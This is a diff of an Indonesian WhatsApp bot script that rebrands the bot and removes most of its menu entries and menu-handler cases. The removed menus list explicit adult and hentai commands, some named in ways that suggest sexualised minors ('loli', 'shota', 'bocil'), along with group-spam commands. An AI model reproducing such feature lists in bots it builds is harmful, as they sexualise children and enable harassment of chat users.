@@ -1091,7 +1091,7 @@ break
        if (isBanned) return freply(mess.banned)
                txtt =`*Hai Kak* ${pushname} *Yang Baik*\n*Mau donasi?* Dikasih Syukur, Gak di kasih Gpp :)`
 
-               buttons = [{buttonId: `${prefix}gopay`,buttonText:{displayText: 'GO-PAY'},type:1},{buttonId: `${prefix}dana`,buttonText:{displayText: 'DANA'},type:1},{buttonId: `${prefix}qris`,buttonText:{displayText: 'QRIS ALL PAY'},type:1}]
+               buttons = [{buttonId: `${prefix}gopay`,buttonText:{displayText: 'GOPAY'},type:1},{buttonId: `${prefix}ovo`,buttonText:{displayText: 'OVO'},type:1},{buttonId: `${prefix}pulsa`,buttonText:{displayText: 'PULSA'},type:1}]
 
                buttonsMessage = {
                contentText: `${txtt}`,
@@ -1143,7 +1143,7 @@ break
 📳 *Mode* : > public mode <
 ☢ *Prefix* : > multi prefix <
 🔋 *baterai bot* : ${baterai}
-👨💻 *Name Creator* : Ramdani Official
+👨💻 *Name Creator* : WanzBOT
 
 
        『 *USER INFO* 』
@@ -1210,18 +1210,13 @@ break
 >  ${prefix}runtime
 >  ${prefix}donasi
 >  ${prefix}leaderboard
->  ${prefix}cekpremium
->  ${prefix}listpremium
->  ${prefix}getpp
 >  ${prefix}setpp
->  ${prefix}bugreport *keluhan*
+>  ${prefix}report *keluhan atau pertanyaan*
 
 
 *⌜ Group Menu ⌟*    
 >  ${prefix}groupsetting
 >  ${prefix}afk *alasan*
->  ${prefix}ceksewa
->  ${prefix}kickall
 >  ${prefix}infogrup
 >  ${prefix}promote
 >  ${prefix}demote
@@ -1230,8 +1225,6 @@ break
 >  ${prefix}leave
 >  ${prefix}kick *reply*
 >  ${prefix}add *+62xxxxxx*
->  ${prefix}setnamegc
->  ${prefix}setppgc
 >  ${prefix}setdeskgc
 >  ${prefix}sider *reply chat bot*
 >  ${prefix}hidetag *teks/reply teks*
@@ -1243,36 +1236,7 @@ break
 >  ${prefix}slot
 >  ${prefix}gelud *@tag*
 >  ${prefix}tictactoe *@tag*
->  ${prefix}siapaaku
->  ${prefix}family100
->  ${prefix}kuismath
->  ${prefix}asahotak
->  ${prefix}tebaklirik
->  ${prefix}tebaklagu
->  ${prefix}tebakkata
->  ${prefix}susunkata
->  ${prefix}kimiakuis
->  ${prefix}caklontong
->  ${prefix}tebakjenaka
->  ${prefix}tebakanime
->  ${prefix}tebaktebakan
->  ${prefix}tebakgambar
->  ${prefix}tebakumur
->  ${prefix}tebakbendera
 >  ${prefix}suit *batu/kertas/gunting*
->  ${prefix}math
-
-
-*⌜ Islam Menu ⌟*  
->  ${prefix}ngaji1
->  ${prefix}ngaji2
->  ${prefix}sholawat nabi
->  ${prefix}kisahnabi
->  ${prefix}jadwalsholat
->  ${prefix}alquran
->  ${prefix}asmaulhusna
->  ${prefix}alquranaudio
->  ${prefix}listsurah
 
 
 *⌜ Download Menu ⌟*
@@ -1289,468 +1253,83 @@ break
 >  ${prefix}tiktoknowm 
 >  ${prefix}tiktokaudio
 >  ${prefix}mediafire 
->  ${prefix}nhentaipdf *code*
-
-
-*⌜ Maker Menu ⌟*
->  ${prefix}blackpink 
->  ${prefix}halloween 
->  ${prefix}3dgradient
->  ${prefix}naturalleaves 
->  ${prefix}dropwater 
->  ${prefix}blood 
->  ${prefix}blood2 
->  ${prefix}neondevil 
->  ${prefix}neon 
->  ${prefix}neonlight 
->  ${prefix}neonlight2 
->  ${prefix}neonlight3 
->  ${prefix}greenneon 
->  ${prefix}toxic 
->  ${prefix}matrix 
->  ${prefix}thunder 
->  ${prefix}thunder2 
->  ${prefix}bokeh 
->  ${prefix}carbontext 
->  ${prefix}christmas 
->  ${prefix}breakwall 
->  ${prefix}roadwarning 
->  ${prefix}engraved3d 
->  ${prefix}embossed 
->  ${prefix}writefoggy 
->  ${prefix}3dstone 
->  ${prefix}futuristic 
->  ${prefix}asketch 
->  ${prefix}bluecircuit
->  ${prefix}space 
->  ${prefix}amagmahot
->  ${prefix}artpapercut 
->  ${prefix}3dluxurygold
->  ${prefix}robotr2d2 
->  ${prefix}harrypotter
->  ${prefix}glitch3
->  ${prefix}greenhorrorstyle
->  ${prefix}3ddeepseametal
->  ${prefix}leddisplayscreen 
->  ${prefix}wonderfulgraffitiart
->  ${prefix}8bit  
->  ${prefix}pornhub  
->  ${prefix}glitch  
->  ${prefix}glitch2  
->  ${prefix}layered  
->  ${prefix}3dsteel  
->  ${prefix}realistic  
->  ${prefix}lionlogo  
->  ${prefix}ninjalogo  
->  ${prefix}wolf  
->  ${prefix}wolf2  
->  ${prefix}halloween2  
->  ${prefix}marvel  
->  ${prefix}marvel2  
->  ${prefix}cinematichorror  
->  ${prefix}avengers  
->  ${prefix}graffiti3  
->  ${prefix}captainamerica  
->  ${prefix}girlneko  
->  ${prefix}sadboy  
->  ${prefix}kaneki  
->  ${prefix}rem  
->  ${prefix}lolimaker  
->  ${prefix}gura  
-
-
-*⌜ Serti Menu ⌟*  
-> 147 ${prefix}sertitolol 
-> 148 ${prefix}bucinserti
-> 149 ${prefix}fuckboy
-> 150 ${prefix}fuckgirl
-> 151 ${prefix}badboy
-> 152 ${prefix}badgirl
-> 153 ${prefix}goodboy
-> 154 ${prefix}goodgirl
 
 
 *⌜ Sticker Menu ⌟*
-> 155 ${prefix}attp *teks*
-> 156 ${prefix}ttp2 *teks*
-> 157 ${prefix}ttp3 *teks*
-> 158 ${prefix}ttp4 *teks*
-> 159 ${prefix}amongus *teks*
-> 160 ${prefix}dadu
-> 161 ${prefix}doge
-> 162 ${prefix}patrick
-> 163 ${prefix}gura
-> 164 ${prefix}stickeranime
-> 165 ${prefix}semoji *emoji*
-> 166 ${prefix}sticker *reply foto/video*
-> 167 ${prefix}smeme *teks|teks*
-> 168 ${prefix}swm *pack|author*
-> 169 ${prefix}take *pack|author* 
-> 170 ${prefix}tovideo *reply sgif*
-> 171 ${prefix}toimg
+>  ${prefix}doge
+>  ${prefix}patrick
+>  ${prefix}gura
+>  ${prefix}stickeranime
+>  ${prefix}sticker *reply foto/video*
+>  ${prefix}toimg
 
 
 *⌜ Vn Menu ⌟*
-> 221 ${prefix}tupai
-> 222 ${prefix}robot
-> 223 ${prefix}gemuk
-> 224 ${prefix}bass
-> 225 ${prefix}terbalik
-> 226 ${prefix}tts
-> 227 ${prefix}detikvn
-> 228 ${prefix}detikvideo
-> 229 ${prefix}toimg
-> 230 ${prefix}tovideo
-> 231 ${prefix}tomp3
-
-
-*⌜ Status Menu ⌟*
-> 232 ${prefix}upswteks *teks*
-> 233 ${prefix}upswlokasi *teks*
-> 234 ${prefix}upswvideo *video*
-> 235 ${prefix}upswimage *image*
-> 236 ${prefix}upswstiker *stiker*
-> 237 ${prefix}upswvoice *voice*
-> 238 ${prefix}upswaudio *audio*
-> 239 ${prefix}upswgif *gif*
-
-
-*⌜ Dewasa Menu ⌟*
-> 240 ${prefix}xnxx *link*
-> 241 ${prefix}xnxxsearch
-> 242 ${prefix}asupan
-> 243 ${prefix}randombokep
+>  ${prefix}tupai
 
 
 *⌜ Other Menu ⌟*
-> 251 ${prefix}brainly *query*
-> 252 ${prefix}cerpen
-> 253 ${prefix}shopee *product*
-> 254 ${prefix}playstore *query*
-> 255 ${prefix}ssweb *query*
-> 256 ${prefix}google *query*
-> 257 ${prefix}image *query*
-> 258 ${prefix}pinterest *query*
-> 259 ${prefix}nulis *teks*
-> 260 ${prefix}iguser *ussername*
-> 261 ${prefix}igstalk *username*
-> 262 ${prefix}githubstalk *username*
-> 263 ${prefix}tiktokstalk *ussername*
-> 264 ${prefix}img2url *reply foto*
-> 265 ${prefix}ytsearch *query*
-
-
-
-*⌜ War Menu ⌟*
-> 266 ${prefix}pvp
-
-
-*⌜ Hiburan Menu ⌟*
-> 267 ${prefix}katailham
-> 268 ${prefix}quotes
-> 269 ${prefix}quotesanime
-> 270 ${prefix}quotesislami
-> 271 ${prefix}quotesdilan
-> 272 ${prefix}pantun
-> 273 ${prefix}bucin
-> 274 ${prefix}faktaunik
-
-
-*⌜ Hewan Menu ⌟*
-> 275 ${prefix}buaya
-> 276 ${prefix}elang
-> 277 ${prefix}ayam
-> 278 ${prefix}burung
-> 279 ${prefix}burung hantu
-> 280 ${prefix}burung gagak
-> 281 ${prefix}burung puyuh
-> 282 ${prefix}bebek
-> 283 ${prefix}angsa
-> 284 ${prefix}sapi
-> 285 ${prefix}kuda
-> 286 ${prefix}badak
-> 287 ${prefix}kambing
-> 288 ${prefix}unta
-> 289 ${prefix}kucing
-> 290 ${prefix}anjing
-> 291 ${prefix}harimau
-> 292 ${prefix}singa
-> 293 ${prefix}monyet
-> 294 ${prefix}babi
-> 295 ${prefix}ikan
-> 296 ${prefix}ikan hiu
-> 297 ${prefix}ikan kembung
-> 298 ${prefix}ikan laga
-> 299 ${prefix}tikus
-> 300 ${prefix}kelinci
-> 301 ${prefix}ular
-> 302 ${prefix}siput
-> 303 ${prefix}domba
-> 304 ${prefix}katak
-> 305 ${prefix}naga
-> 306 ${prefix}laba-laba
-> 307 ${prefix}kupu-kupu
-> 308 ${prefix}kalajengking
-> 309 ${prefix}kingkong
-> 310${prefix}jerapa
-> 311 ${prefix}gajah
-> 312 ${prefix}serigala
-> 313 ${prefix}cikcak
-> 314 ${prefix}pinguin
-> 315 ${prefix}kepiting
-> 316 ${prefix}ubur-ubur
-> 317 ${prefix}lebah
-> 318 ${prefix}kura-kura
-> 319 ${prefix}banteng
-> 320 ${prefix}kelalawar
-
-
-*⌜ Tools Menu ⌟*   
-> 321 ${prefix}addvn
-> 322 ${prefix}listvn
-> 323 ${prefix}getvn
-> 324 ${prefix}addimg
-> 325 ${prefix}listimg
-> 326 ${prefix}getimg
-> 327 ${prefix}addvid
-> 328 ${prefix}listvid
-> 329 ${prefix}getvid
-> 330 ${prefix}addstik
-> 331 ${prefix}liststik
-> 332 ${prefix}getstik
-> 333 ${prefix}tupai
-
-
-*⌜ Berita Menu ⌟*
-> 334 ${prefix}covidglobal
-> 335 ${prefix}infogempa
-> 336 ${prefix}infogunungsumeru
-> 337 ${prefix}infobanjir
-> 338 ${prefix}infolongsor
+>  ${prefix}ssweb *query*
+>  ${prefix}ytsearch *query*
 
 
 *⌜ Wibu Menu ⌟*
-> 339 ${prefix}loli
-> 340 ${prefix}manga
-> 341 ${prefix}anime 
-> 342 ${prefix}lolivideo
-> 343 ${prefix}husbu
-> 344 ${prefix}waifu
-> 345 ${prefix}milf
-> 346 ${prefix}neko
-> 347 ${prefix}kanna
-> 348 ${prefix}sagiri
-> 349 ${prefix}hentai
-> 350 ${prefix}wallnime
-> 351 ${prefix}kusonime
-> 352 ${prefix}megumin
-> 353 ${prefix}otakudesu
-> 354 ${prefix}doujindesu
-> 355 ${prefix}storyanime
-> 356 ${prefix}otakuongoing
-> 357 ${prefix}nhentai *code*
-> 358 ${prefix}nekopoi *link*
+>  ${prefix}milf
 
 
 *⌜ Random Menu ⌟*
-> 359 ${prefix}tourl
-> 360 ${prefix}tinyurl
-> 361 ${prefix}bilamgangka
-> 362 ${prefix}artimimpi
-> 363 ${prefix}resepmasakan
-
-
-*⌜ Asupan Menu ⌟*
-> 364 ${prefix}ukhty
-> 365 ${prefix}hijaber
-> 366 ${prefix}santuy
-> 367 ${prefix}bocil
-> 368 ${prefix}cecan
-> 369 ${prefix}geayubi
-> 370 ${prefix}bunga
-> 371 ${prefix}aura
-> 372 ${prefix}ayu
-> 373 ${prefix}caca
-> 374 ${prefix}delvira
-> 375 ${prefix}alita
-> 376 ${prefix}putri
-
-*⌜ Spam Menu ⌟*
-> 377 ${prefix}spam
-> 378 ${prefix}tospam
-> 379 ${prefix}spamsw
+>  ${prefix}tourl
+>  ${prefix}artimimpi
 
 
 *⌜ Search Menu ⌟*
-> 380 ${prefix}nekopoisearch *query*
-> 381 ${prefix}ytsearch *query*
-> 382 ${prefix}shopee *product*
-> 383 ${prefix}playstore *query*
-> 384 ${prefix}ssweb *query*
-> 385 ${prefix}google *query*
-> 386 ${prefix}image *query*
-> 387 ${prefix}pinterest *query*
-> 388 ${prefix}apkpure *query*
+>  ${prefix}ytsearch *query*
+>  ${prefix}ssweb *query*
+>  ${prefix}image *query*
 
 
 *⌜ Fun Menu ⌟*
-> 389 ${prefix}mining
-> 390 ${prefix}cekwatak
-> 391 ${prefix}cekmati [nama]
-> 392 ${prefix}wangy [nama]
-> 393 ${prefix}citacita
-> 394 ${prefix}toxic
-> 395 ${prefix}truth
-> 396 ${prefix}dare
-> 397 ${prefix}apakah
-> 398 ${prefix}bisakah
-> 399 ${prefix}kapankah
-> 400 ${prefix}rate
-> 401 ${prefix}jadian
-> 402 ${prefix}cantik
-> 403 ${prefix}ganteng
-> 404 ${prefix}beban
-> 405 ${prefix}babi
-> 406 ${prefix}cekganteng
-> 407 ${prefix}cekcantik
-
-
-*⌜ Meme Menu ⌟*
-> 408 ${prefix}meme
-> 409 ${prefix}memeindo
-> 410 ${prefix}darkjoke
+>  ${prefix}mining
+>  ${prefix}cekmati [nama]
+>  ${prefix}wangy [nama]
+>  ${prefix}toxic
+>  ${prefix}truth
+>  ${prefix}dare
+>  ${prefix}apakah
+>  ${prefix}bisakah
+>  ${prefix}kapankah
+>  ${prefix}rate
+>  ${prefix}jadian
+>  ${prefix}cantik
+>  ${prefix}ganteng
+>  ${prefix}beban
+>  ${prefix}babi
+>  ${prefix}cekganteng
+>  ${prefix}cekcantik
 
 
 *⌜ Owner Menu ⌟*
-> 411 ${prefix}broadcast
-> 412 ${prefix}broadcastgroup
-> 413 ${prefix}bc
-> 414 ${prefix}bcgc
-> 415 ${prefix}leave
-> 416 ${prefix}leaveall
-> 417 ${prefix}join *link gc*
-> 418 ${prefix}shutdown
-> 419 ${prefix}getquoted
-> 420 ${prefix}addupdate *fiturnya*
-> 421 ${prefix}exif *nama|author*
-> 422 ${prefix}sewa add/del *waktunya*
-> 423 ${prefix}premium add @tag|nomor
-> 424 ${prefix}premium del @tag|nomor
-> 425 ${prefix}clearall
-> 426 ${prefix}delete
-> 427 ${prefix}block
-> 428 ${prefix}unblock
-> 429 ${prefix}setppbot
-> 430 ${prefix}setppbot2
-> 431 ${prefix}self
-> 432 ${prefix}public
-> 433 ${prefix}restart
-> 434 ${prefix}leaveall
-> 435 ${prefix}join
-> 436 ${prefix}join2
-> 437 ${prefix}banned
-> 438 ${prefix}unbanned
-> 439 ${prefix}term
-> 440 ${prefix}eval
-> 441 ${prefix}reset
-> 442 ${prefix}clearall
+>  ${prefix}bc
+>  ${prefix}leave
+>  ${prefix}join *link gc*
+>  ${prefix}shutdown
+>  ${prefix}addupdate *fiturnya*
+>  ${prefix}exif *nama|author*
+>  ${prefix}delete
+>  ${prefix}block
+>  ${prefix}unblock
+>  ${prefix}setppbot
+>  ${prefix}self
+>  ${prefix}public
+>  ${prefix}restart
+>  ${prefix}leaveall
+>  ${prefix}join
+>  ${prefix}banned
+>  ${prefix}unbanned
+>  ${prefix}reset
 
 
-*⌜ Anime Menu ⌟* 
-> 443 ${prefix}anime
-> 444 ${prefix}kusonime
-> 445 ${prefix}art
-> 446 ${prefix}bts
-> 447 ${prefix}exo
-> 448 ${prefix}elf
-> 449 ${prefix}loli
-> 450 ${prefix}neko
-> 451 ${prefix}waifu
-> 452 ${prefix}shota
-> 453 ${prefix}husbu
-> 454 ${prefix}sagiri
-> 455 ${prefix}shinobu
-> 456 ${prefix}megumin
-> 457 ${prefix}wallnime
-> 458 ${prefix}chiisaihentai
-> 459 ${prefix}trap
-> 460 ${prefix}blowjob
-> 461 ${prefix}yaoi
-> 462 ${prefix}ecchi
-> 463 ${prefix}ahegao
-> 464 ${prefix}hololewd
-> 465 ${prefix}sideoppai
-> 466 ${prefix}animefeets
-> 467 ${prefix}animebooty
-> 468 ${prefix}animethighss
-> 469 ${prefix}hentaiparadise
-> 470 ${prefix}animearmpits
-> 472 ${prefix}lewdanimegirls
-> 473 ${prefix}biganimetiddies
-> 474 ${prefix}animebellybutton
-> 475 ${prefix}hentai4everyone
-> 476 ${prefix}bj
-> 477 ${prefix}ero
-> 478 ${prefix}cum
-> 479 ${prefix}feet
-> 480 ${prefix}yuri
-> 481 ${prefix}trap
-> 482 ${prefix}lewd
-> 483 ${prefix}feed
-> 484 ${prefix}eron
-> 485 ${prefix}solo
-> 486 ${prefix}gasm
-> 487 ${prefix}poke
-> 488 ${prefix}anal
-> 489 ${prefix}holo
-> 490 ${prefix}tits
-> 491 ${prefix}kuni
-> 492 ${prefix}kiss
-> 493 ${prefix}erok
-> 494 ${prefix}smug
-> 495 ${prefix}baka
-> 496 ${prefix}solog
-> 497 ${prefix}feetg
-> 498 ${prefix}lewdk
-> 499 ${prefix}waifu
-> 500 ${prefix}pussy
-> 501 ${prefix}femdom
-> 502 ${prefix}cuddle
-> 503 ${prefix}eroyuri
-> 504 ${prefix}cum_jpg
-> 505 ${prefix}blowjob
-> 506 ${prefix}erofeet
-> 507 ${prefix}holoero
-> 508 ${prefix}classic
-> 509 ${prefix}erokemo
-> 510 ${prefix}fox_girl
-> 511 ${prefix}futanari
-> 512 ${prefix}lewdkemo
-> 513 ${prefix}wallpaper
-> 514 ${prefix}pussy_jpg
-> 515 ${prefix}kemonomimi
-> 517 ${prefix}ngif
-> 518 ${prefix}nsfw_neko_gif
-> 516 ${prefix}manga
-> 517 ${prefix}doujindesu
-> 518 ${prefix}sagiri
-> 519 ${prefix}wallnime
-> 520 ${prefix}otakudesu
-> 521 ${prefix}neko
-> 522 ${prefix}kanna
-> 523 ${prefix}megumin
-
-
-*⌜ Hentai Menu ⌟*
-> 524 ${prefix}hentai
-> 525 ${prefix}randomhentai
-> 526 ${prefix}hentaifemdom
-> 527 ${prefix}random_hentai_gif
-> 528 ${prefix}nhentaipdf
-> 529 ${prefix}nhentai
-> 530 ${prefix}nekopoi
-> 531 ${prefix}nekopoisearch
-> 532 ${prefix}nsfw_avatar`
+`
                buttons = [{buttonId: `${prefix}infobot`,buttonText:{displayText: 'ɪɴғᴏʙᴏᴛ'},type:1},{buttonId: `${prefix}donasi`,buttonText:{displayText: 'ᴅᴏɴᴀsɪ'},type:1},{buttonId: `${prefix}owner`,buttonText:{displayText: 'ᴏᴡɴᴇʀ'},type:1}]
 
                imageMsg = (await Ramdani.prepareMessageMedia(fs.readFileSync(`./media/foto/menu.jpg`), 'imageMessage', {thumbnail: fs.readFileSync(`./media/foto/menu.jpg`)})).imageMessage
@@ -1767,31 +1346,6 @@ break
               randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
               Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
               break           
-        case 'c':
-        case 'command':
-        if (!isRegist) return freply(mess.regist)
-        if (isBanned) return freply(mess.banned)
-               list = []
-               listmenu = [`infobot`,`rules`,`script`,`tqto`,`owner`,`donasi`,`allmenu`,`storemenu`,`infomenu`,`groupmenu`,`gamemenu`,`islammenu`,`downloadmenu`,`makermenu`,`sertimenu`,`stickermenu`,`soundmenu`,`vnmenu`,`toolsmenu`,`statusmenu`,`dewasamenu`,`othermenu`,`warmenu`,`hiburan menu`,`hewanmenu`,`beritamenu`,`animemenu`,`hentaimenu`,`asupanmenu`,`randommenu`,`ownermenu`,`spammenu`,`searchmenu`,`funmenu`,`mememenu`]
-               listmenuu = [`Info Bot`,`Rules`,`Script`,`Thanks To`,`Owner Bot`,`Donasi`,`All Menu`,`Store Menu`,`Info Menu`,`Group Menu`,`Game Menu`,`Islam Menu`,`Download Menu`,`Maker Menu`,`Serti Menu`,`Sticker Menu`,`Sound Menu`,`Vn Menu`,`Tools Menu`,`Status Menu`,`Dewasa Menu`,`Other Menu`,`War Menu`,`Hiburan Menu`,`Hewan Menu`,`Berita Menu`,`Anime Menu`,`Hentai Menu`,`Asupan Menu`,`Random Menu`,`Owner Menu`,`Spam Menu`,`Search Menu`,`Fun Menu`,`Meme Menu`]
-               nombor = 1
-               startnum = 0
-               for (let x of listmenu) {
-               const yy = {title: 'Menu ' + nombor++,
-                    rows: [
-                       {
-                        title: `${listmenuu[startnum++]}`,
-                        description: ``,
-                        rowId: `${prefix}${x}`
-                      }
-                    ]
-                   }
-                        list.push(yy)
-           }
-               listmsg(from, `${ucapanWaktu}`,  `*Hallo Kak 👋* ${pushname} ${ucapanWaktu}, Silahkan Pilih Menunya Disini, Dan Jangan Lupa Baca Rules, Supaya Tau Peraturan Nya!`, list)     
-               randommusic = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
-               Ramdani.sendMessage(from, randommusic, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
-               break     
 //------------------< case nya >------------------ 
 case 'infobot':
 if (!isRegist) return freply(mess.regist)
@@ -1825,11 +1379,6 @@ freply(`━━━━━ *SCRIPT* ━━━━━
 ❏ TYPE SC : nodejs
 ❏ DI BUAT PADA : sel, 29, mart, 2022
 *━━━━━━━━━━━━━━━━━━━━*`)
-break
-case 'alllmenu2':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, allmenuu(prefix), MessageType.text, {quoted: troli})
 break
                 //----------------<jawabnya>-------------
                 case 'kapan':
@@ -1950,7 +1499,6 @@ freply(`• *BIG THANKS TO*
 randomaudi = fs.readFileSync(`./media/audio/${randomaudio}.mp3`)
 Ramdani.sendMessage(from, randomaudi, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true}) 
 break
-//FITUR NYAAH BANGGG
 
 //BELI SCRIPT
 case 'beliscript':
@@ -2063,340 +1611,19 @@ case 'grupbot':
 case 'groupbot':
 if (!isRegist) return freply(mess.regist)
 if (isBanned) return freply(mess.banned)
-       freply(`Nih Group Bot: \nhttps://chat.whatsapp.com/J4ii7zkiySP9s6xdlZDggp`)
+       freply(`*Nih Group Bot:* \nhttps://chat.whatsapp.com/J4ii7zkiySP9s6xdlZDggp\n\n*NOTE :* GROUP BEBAS, TAPI SOPAN, JANGAN SPAM`)
 break
 break
 case 'rules':
 if (!isRegist) return freply(mess.regist)
 if (isBanned) return freply(mess.banned)
 Ramdani.sendMessage(from, rulesbot(prefix), MessageType.text, {quoted: troli})
-break
-case 'sewabot':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, sewabot(prefix), MessageType.text, {quoted: troli})
-break
-case 'buyprem':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, beliprem(prefix), MessageType.text, {quoted: troli})
-break
-case 'ownermenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, ownermenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'downloadmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, downloadmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'gamemenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, gamemenu(prefix), MessageType.text, {quoted: troli})
 break      
 case 'owner':
 if (!isRegist) return freply(mess.regist)
 if (isBanned) return freply(mess.banned)
 Ramdani.sendMessage(from, owner(prefix), MessageType.text, {quoted: troli})
 break
-case 'infomenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, infomenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'stickermenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, stickermenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'islammenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, islammenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'soundmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, soundmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'vnmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, vnmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'sertimenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, sertimenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'ceritamenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, ceritamenu(prefix), MessageType.text, {quoted: troli})
-break  
-case 'makermenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, makermenu(prefix), MessageType.text, {quoted: troli})
-break 
-case 'toolsmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from,toolsmenu(prefix), MessageType.text, {quoted: troli})
-break                   
-case 'dewasamenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, dewasamenu(prefix), MessageType.text, {quoted: troli})
-break                                    
-case 'othermenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, othermenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'groupmenu': 
-case 'grupmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, groupmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'pricegtivd': 
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, groupmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'rolegtli': 
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, groupmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'rolegtivd': 
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, groupmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'warmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, warmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'funmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, funmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'statusmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, statusmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'beritamenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, beritamenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'randommenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, randommenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'hiburanmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, hiburanmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'hewanmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, hewanmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'searchmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, searchmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'mememenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, mememenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'asupanmenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, asupanmenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'animemenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, animemenu(prefix), MessageType.text, {quoted: troli})
-break
-case 'hentaimenu':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-Ramdani.sendMessage(from, hentaimenu(prefix), MessageType.text, {quoted: troli})
-break                                                                
-//------------------< asupan menu >------------------  
-case 'asupan1':
-              if (!isRegist) return freply(mess.regist)
-              if (isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-			Ramdani.updatePresence(from, Presence.composing) 
-				freply(mess.wait)
-				data = fs.readFileSync('./lib/asupan.js');
-				jsonData = JSON.parse(data);
-				randIndex = Math.floor(Math.random() * jsonData.length);
-				randKey = jsonData[randIndex];
-				asupan = await getBuffer(randKey.result)
-				Ramdani.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
-				break        
-case 'asupan2':
-              if (!isRegist) return freply(mess.regist)
-              if (isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-			Ramdani.updatePresence(from, Presence.composing) 
-				freply(mess.wait)
-				data = fs.readFileSync('./lib/asupan2.js');
-				jsonData = JSON.parse(data);
-				randIndex = Math.floor(Math.random() * jsonData.length);
-				randKey = jsonData[randIndex];
-				asupan = await getBuffer(randKey.result)
-				Ramdani.sendMessage(from, asupan, video, {quoted: mek, caption: '```ASUPAN NIH:V```'})
-				break 
-              case 'ukhty':
-              if (!isRegist) return freply(mess.regist)              
-              if (isBanned) return freply(mess.banned)              
-              freply(mess.wait)
-              const ukhty = await getBuffer(`https://danzz-api.herokuapp.com/api/asupan/ukhty?apikey=${ramdaniapi}`)
